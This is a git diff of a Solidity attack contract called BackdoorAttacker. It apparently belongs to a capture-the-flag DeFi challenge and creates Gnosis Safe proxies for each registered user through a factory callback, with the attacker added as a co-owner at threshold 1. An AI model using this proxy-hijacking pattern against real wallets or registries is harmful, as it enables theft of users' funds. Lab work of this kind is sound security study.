@@ -15,24 +15,38 @@ contract BackdoorAttacker is Ownable {
     constructor(
         GnosisSafe masterCopy,
         GnosisSafeProxyFactory proxyFactory,
-        IProxyCreationCallback callback
+        IProxyCreationCallback callback,
+        address[] memory users
     ) payable {
         _initializeOwner(msg.sender);
+
+        for (uint256 i = 0; i < users.length; i++) {
+            createProxy(masterCopy, proxyFactory, callback, users[i], i);
+        }
+    }
+
+    function createProxy(
+        GnosisSafe masterCopy,
+        GnosisSafeProxyFactory proxyFactory,
+        IProxyCreationCallback callback,
+        address user,
+        uint256 salt
+    ) private {
         address proxy = address(
             proxyFactory.createProxyWithCallback(
                 address(masterCopy),
                 abi.encodeWithSelector(
                     GnosisSafe.setup.selector,
-                    [msg.sender],
+                    [user, msg.sender],
                     1,
                     address(0),
-                    abi.encode(""),
+                    bytes("0x"),
                     address(0),
                     address(0),
                     0,
                     address(0)
                 ),
-                0,
+                salt,
                 callback
             )
         );
